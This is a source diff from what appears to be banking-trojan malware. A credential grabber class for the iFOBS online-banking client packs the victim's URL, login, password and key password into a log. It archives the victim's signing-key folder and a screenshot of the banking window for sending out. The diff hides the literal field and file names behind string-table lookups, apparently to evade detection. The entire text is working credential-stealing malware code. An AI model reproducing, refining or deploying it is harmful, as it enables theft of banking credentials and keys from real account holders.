@@ -259,10 +259,10 @@ string TIfobsOnlineGrabber::PackTextData()
 	{
 		TBotStrings Fields;
 		Fields.ValueDelimeter = ": ";
-        Fields.AddValue("URL", GetURLFromJavaProcess());
-		Fields.AddValue("Login", FLogin);
-		Fields.AddValue("Password", FPassword);
-		Fields.AddValue("KeyPassword", FKeyPassword);
+        Fields.AddValue(GetStr(EStrLogFieldURL), GetURLFromJavaProcess());
+		Fields.AddValue(GetStr(EStrLogFieldLogin), FLogin);
+		Fields.AddValue(GetStr(EStrLogFieldPassword), FPassword);
+		Fields.AddValue(GetStr(EStrLogFieldKeyPassword), FKeyPassword);
 
 		Result = Fields.GetText();
 	}
@@ -283,7 +283,7 @@ void TIfobsOnlineGrabber::AddFilesToCab(LPVOID Cab)
 
 	// Проверяем максимальный размер папки с ключами
 	if (SizeFolderLess(FKeyFilePath.t_str(), IFOBS_MAX_KEY_PATH_SIZE, NULL))
-		AddDirToCab(Cab, FKeyFilePath.t_str(), "Keys");
+		AddDirToCab(Cab, FKeyFilePath.t_str(), GetStr(EStrLogKeyPath).t_str());
 }
 //----------------------------------------------------------------------------
 
@@ -307,13 +307,13 @@ BOOL TIfobsOnlineGrabber::SendLog()
 	if (Cab)
 	{
 		// Упаковываем логин и пароли
-		AddStringToCab(Cab, Log, "Log.txt");
+		AddStringToCab(Cab, Log, GetStr(StrLogFileInformation));
 
 		// Добавляем скриншот
 		string Screen = File::GetTempName2A();
 		bool AddScreen = ScreenShot::Make(GetTopParentWindow(FSunAwtFrameWnd), 0, 0, 0, 0, NULL, Screen.t_str());
 		if (AddScreen)
-			AddFileToCab(Cab, Screen.t_str(), "Screen.png");
+			AddFileToCab(Cab, Screen.t_str(), GetStr(StrLogFileScreenShot));
 		pDeleteFileA(Screen.t_str());
 
 		// Добавляем ключи
